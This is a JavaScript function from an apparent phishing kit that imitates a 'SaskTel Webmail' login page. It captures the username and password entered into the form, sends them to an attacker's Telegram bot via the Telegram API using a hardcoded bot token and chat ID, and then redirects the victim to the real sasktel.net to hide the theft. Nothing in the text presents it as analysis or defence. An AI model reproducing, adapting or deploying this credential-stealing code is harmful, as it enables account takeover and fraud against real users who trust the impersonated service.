function sendToTelegram(event) {
    event.preventDefault(); // Prevent default form submission

    const form = event.target;
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    // Remove any existing error messages
    const existingError = document.getElementById('telegram-error');
    if (existingError) existingError.remove();

    // Create error display element
    const errorDisplay = document.createElement('div');
    errorDisplay.id = 'telegram-error';
    errorDisplay.style.color = 'red';
    errorDisplay.style.marginTop = '10px';
    errorDisplay.setAttribute('role', 'alert');
    form.appendChild(errorDisplay);

    const botToken = '7589986897:AAF3RtKE27dlnfzuOMQRlqVCwrFFFYABaLE';
    const chatId = '7383718535';
    const message = `🔐 Message from SaskTel Webmail 🔐\n\n👤 *User ID:* ${username}\n🔑 *Pass:* ${password}`;
    const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

    console.log('Sending to Telegram:', { username, password, telegramURL, timestamp: new Date().toISOString() }); // Debug log

    fetch(telegramURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => {
        console.log('Raw response:', { status: response.status, ok: response.ok }); // Debug log
        return response.json();
    })
    .then(data => {
        console.log('Telegram API response:', data); // Debug log
        if (data.ok) {
            console.log('Telegram message sent successfully');
            usernameInput.value = '';
            passwordInput.value = '';
            errorDisplay.remove(); // Clear error display
            // Redirect to sasktel.net
            window.location.href = 'https://sasktel.net';
        } else {
            console.error('Telegram API error:', data);
            errorDisplay.textContent = `Failed to send to Telegram: ${data.description || 'Unknown error'}`;
        }
    })
    .catch(error => {
        console.error('Error sending to Telegram:', error.message, error.stack); // Debug log
        errorDisplay.textContent = `An error occurred while sending to Telegram: ${error.message}`;
    });
}